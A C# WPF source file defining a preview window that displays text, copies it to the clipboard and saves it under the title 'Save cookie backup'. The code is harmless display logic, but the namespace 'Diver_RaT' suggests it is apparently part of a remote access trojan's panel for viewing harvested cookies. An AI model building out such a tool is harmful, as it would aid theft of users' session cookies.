using System;
using System.IO;
using System.Linq;
using System.Windows;
using Microsoft.Win32;

namespace Diver_RaT
{
    public partial class PreviewWindow : Window
    {
        private readonly string _fileName;

        public PreviewWindow(string title, string content, string fileName)
        {
            InitializeComponent();
            Title = title;
            _fileName = fileName;
            ContentBox.Text = content;
            MetaText.Text = $"{content.Split('\n').Length} lines, {content.Length:N0} chars";
            AutoFit(content);
        }

        private void CopyButton_Click(object sender, RoutedEventArgs e)
        {
            if (ContentBox.Text.Length == 0) return;
            Clipboard.SetText(ContentBox.Text);
            MetaText.Text = "copied to clipboard";
        }

        private void DownloadButton_Click(object sender, RoutedEventArgs e)
        {
            if (ContentBox.Text.Length == 0) return;
            var safe = string.Concat(_fileName.Where(c => !Path.GetInvalidFileNameChars().Contains(c)));
            if (string.IsNullOrWhiteSpace(safe)) safe = "cookies";
            var dlg = new SaveFileDialog
            {
                FileName = safe + ".txt",
                Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*",
                Title = "Save cookie backup"
            };
            if (dlg.ShowDialog(this) != true) return;
            File.WriteAllText(dlg.FileName, ContentBox.Text);
            MetaText.Text = $"saved to {dlg.FileName}";
        }

        private void AutoFit(string content)
        {
            var lines = content.Replace("\r\n", "\n").Split('\n');
            int maxLen = 60;
            if (lines.Length > 0) maxLen = Math.Max(maxLen, lines.Max(l => l.Length));

            const double charWidth = 7.2;
            const double lineHeight = 16.5;
            var workArea = SystemParameters.WorkArea;

            double width = Math.Min(workArea.Width - 40, Math.Max(460, maxLen * charWidth + 48));
            double height = Math.Min(workArea.Height - 40, Math.Max(220, lines.Length * lineHeight + 104));

            Width = width;
            Height = height;
            MinWidth = 460;
            MinHeight = 260;
        }
    }
}
